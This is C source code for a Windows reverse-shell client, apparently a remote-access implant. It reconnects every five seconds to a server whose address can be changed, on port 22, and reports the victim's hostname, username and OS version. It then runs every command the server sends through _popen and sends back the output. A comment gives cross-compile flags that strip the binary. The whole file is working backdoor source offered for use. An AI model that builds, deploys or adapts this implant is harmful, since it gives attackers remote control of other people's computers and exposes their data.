#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

// Cross compile
// x86_64-w64-mingw32-gcc client.c -o client.exe -lws2_32 -Os -s
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 22
#define BUFFER_SIZE 4096

void get_system_info(char *info, size_t size) {
    char hostname[256];
    DWORD hostname_len = sizeof(hostname);
    char username[256];
    DWORD username_len = sizeof(username);
    OSVERSIONINFOEX osvi;
    SYSTEM_INFO sysinfo;

    if (GetComputerNameA(hostname, &hostname_len) == 0) {
        strcpy(hostname, "Unknown");
    }
    if (GetUserNameA(username, &username_len) == 0) {
        strcpy(username, "Unknown");
    }

    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO *)&osvi);

    GetSystemInfo(&sysinfo);

    snprintf(info, size, "%s,%s,Windows,%ld.%ld,%s",
             hostname,
             username,
             osvi.dwMajorVersion,
             osvi.dwMinorVersion,
             (sysinfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86");
}

void shell_loop(SOCKET sock) {
    char buffer[BUFFER_SIZE];
    char command[BUFFER_SIZE];
    DWORD bytesRead;
    FILE *fp;
    int n;

    while (1) {
        memset(command, 0, sizeof(command));
        n = recv(sock, command, sizeof(command) - 1, 0);
        if (n <= 0) {
            break;
        }

        command[strcspn(command, "\r\n")] = 0; // Remove newline

        if (_stricmp(command, "die") == 0) {
            break;
        }

        if (_strnicmp(command, "cd ", 3) == 0) {
            char *path = command + 3;
            if (!SetCurrentDirectoryA(path)) {
                snprintf(buffer, sizeof(buffer), "Error: No such directory: %s\n", path);
                send(sock, buffer, strlen(buffer), 0);
            }
            send(sock, "__END__\n", 8, 0);
            continue;
        }

        // Execute command
        fp = _popen(command, "r");
        if (fp == NULL) {
            char *error_msg = "Error executing command\n";
            send(sock, error_msg, strlen(error_msg), 0);
            send(sock, "__END__\n", 8, 0);
            continue;
        }

        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            send(sock, buffer, strlen(buffer), 0);
        }
        _pclose(fp);

        send(sock, "__END__\n", 8, 0);
    }
}

void connect_server() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server_addr;
    char sysinfo[512];

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        get_system_info(sysinfo, sizeof(sysinfo));
        send(sock, sysinfo, strlen(sysinfo), 0);
        send(sock, "\n", 1, 0);

        shell_loop(sock);

        closesocket(sock);
        Sleep(5000);
    }

    WSACleanup();
}

int main() {
    connect_server();
    return 0;
}
